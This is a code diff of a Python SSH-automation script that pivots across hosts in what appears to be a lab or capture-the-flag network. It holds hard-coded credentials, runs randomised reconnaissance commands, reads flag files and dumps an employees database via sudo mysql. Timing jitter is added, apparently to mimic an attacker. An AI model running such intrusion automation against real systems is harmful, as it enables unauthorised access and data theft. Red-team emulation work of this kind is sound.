@@ -2,6 +2,7 @@ import paramiko
 import time
 from functools import partial
 import re
+import random
 
 LINUX_OS = 0
 WINDOWS_OS = 1
@@ -34,7 +35,8 @@ def send_command(channel, command, password_prompt=None, password=None, os=LINUX
     global prompt
 
     # we are burning and need to change back to the old prompt
-    if command == 'exit' or command == 'quit':
+    # *** THIS ASSUMES WE ARE EXITING BACK TO THE FIRST HOP ***
+    if command == 'exit':
         prompt = primary_prompt
 
     print('Sending:', command)
@@ -106,19 +108,20 @@ def ssh_chain(channel, server_info, os):
     set_prompt(prompt, channel, os)
 
 
+# all of this is custom to the anonymous ftp login
 def ftp_chain(channel, server_info):
     ftp_command = f'ftp {server_info["hostname"]}'
 
     # tell it to expect the ftp prompt now
     global prompt
-    prompt = server_info['prompt']
+    prompt = 'ftp>'
 
     # in this case we are using the password as the username because we are signing in an anon account
     send_command(
         channel,
         ftp_command,
         password_prompt='Name (',
-        password=server_info['username'],
+        password='anonymous',
         os=LINUX_OS  # ftp server only funs on linux machine
     )
 
@@ -131,36 +134,75 @@ first_server = {
 }
 
 # List of second-hop servers
+# servers with multiple methods will have multiple entries
 pivot_servers = [
     {
         'name'    : 'Database Server',
         'hostname': '192.168.1.36',
         'username': 'uws-it',
         'password': 'uwsit2021',
-        'prompt'  : 'PROMPT2$>'
+        'prompt'  : 'PROMPT2$>',
+        'os'      : LINUX_OS,
+        'info_gather_commands' : [
+            'ls',
+            'whoami',
+            'pwd',
+            'cd /etc,ls',
+            'ifconfig',
+            'systemctl --no-pager status mysql',
+            'ps aux | grep mysql',
+            'hostname',
+            'uname -a',
+            'cat /proc/version'
+        ],
+        'get_flag_commands' : [
+            'sudo mysql -u root',
+            'show databases;,use employees;,show tables;,select * from employees;',
+            'quit'
+        ]
     },
     {
         'name'   : 'FTP Server',
         'hostname': '192.168.1.27',
-        'username': 'anonymous',
-        'password': '',
-        'prompt'  : 'ftp>'
+        'username': 'ftp-user',
+        'password': 'ftp-pass',
+        'prompt'  : 'PROMPT5$>',
+        'os'      : LINUX_OS
     },
     {
         'name'   : 'Windows Host',
         'hostname': '192.168.1.29',
         'username': 'user',
         'password': 'win-pass',
-        'prompt'  : 'PROMPT3$>'
+        'prompt'  : 'PROMPT3$>',
+        'os'      : WINDOWS_OS
     },
     {
         'name'   : 'Windows Server',
         'hostname': '192.168.1.24',
         'username': 'Administrator',
         'password': 'Admin123!',
-        'prompt'  : 'PROMPT4$>'
+        'prompt'  : 'PROMPT4$>',
+        'os'      : WINDOWS_OS
     } 
 ]
+
+firsthop_info_gathering_commands = [
+    'whoami',
+    'ifconfig',
+    'cat /etc/resolv.conf',
+    'ping -c 4 192.168.1.24',
+    'ping -c 4 192.168.1.29',
+    'ping -c 4 192.168.1.37',
+    'ping -c 4 192.168.1.36',
+    'systemctl --no-pager status apache2',
+    'cd /home/it-dept,cat flag.txt'
+]
+
+def random_command_sleep():
+    sleep_time = random.uniform(1,7)
+    print(f'Sleeping for {sleep_time:.2f} seconds')
+    time.sleep(sleep_time)
 
 
 def main():
@@ -177,6 +219,7 @@ def main():
 
     pivot_database = partial(ssh_chain, channel=channel, server_info=pivot_servers[0], os=LINUX_OS)
     pivot_ftp = partial(ftp_chain, channel=channel, server_info=pivot_servers[1], os=LINUX_OS)
+    pivot_ftp_ssh = partial(ssh_chain, channel=channel, server_info=pivot_servers[1], os=LINUX_OS)
     pivot_windows_host = partial(ssh_chain, channel=channel, server_info=pivot_servers[2], os=WINDOWS_OS)
     pivot_windows_server = partial(ssh_chain, channel=channel, server_info=pivot_servers[3], os=WINDOWS_OS)
 
@@ -185,14 +228,52 @@ def main():
     set_prompt(prompt, channel, LINUX_OS)
 
     # send commands on first pivot host
-    send_command(channel, 'whoami', os=LINUX_OS)
+    for command_string in random.sample(firsthop_info_gathering_commands, 5):
+        for command in command_string.split(','):
+            send_command(channel, command, os=LINUX_OS)
+            random_command_sleep()
+    random_command_sleep()
 
-    pivot_windows_host()
-    send_command(channel, 'hostname', os=WINDOWS_OS)
-    send_command(channel, 'exit', os=WINDOWS_OS)
+    # now randomly pivot to another one of the hosts
+    # for now just do the database
+    pivot_database()
+
+    # randomly do info gathering commands on the remote host
+    server_info = pivot_servers[0]
+    for command_string in random.sample(server_info['info_gather_commands'], 5):
+        for command in command_string.split(','):
+            send_command(channel, command, os=server_info['os'])
+            random_command_sleep()
+    random_command_sleep()
+
+    # now do get flag commands
+    change_command = server_info['get_flag_commands'][0]
+    old_prompt = prompt
+    prompt = 'mysql>'
+    send_command(channel, change_command, password_prompt='[sudo] password', password='uwsit2021', os=server_info['os'])
+
+    mysql_commands = server_info['get_flag_commands'][1]
+    for command in mysql_commands.split(','):
+        send_command(channel, command, os=server_info['os'])
+        random_command_sleep()
+    random_command_sleep()
+
+    quit_command = server_info['get_flag_commands'][2]
+    prompt = old_prompt
+    send_command(channel, quit_command, os=server_info['os'])
+
+    random_command_sleep()
 
     # Close the SSH connection to the first server
     ssh_client.close()
+
+    # TODO
+    # Wow this worked!
+    # Next is to clean this up and make it work with all the other boxes too. It does not have to be fully portable for each random box
+    # that might be chosen or every path that it might go down by it would be good to make it as good as possible
+    # First step is to add info gathering and get flag commands for each other pivot.
+    # Then, try and make them all work together. Probably be fine to have a switch statement to have individual logic to deal
+    # with each one since there are only four options for that.
 
 
 if __name__ == '__main__':
